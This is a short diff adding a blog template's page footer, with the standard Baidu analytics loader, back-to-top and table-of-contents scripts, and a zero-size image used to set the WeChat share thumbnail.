+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = 'xxx';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+<!-- Image to hack wechat -->
+<img src="http://www.mingxin.live/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
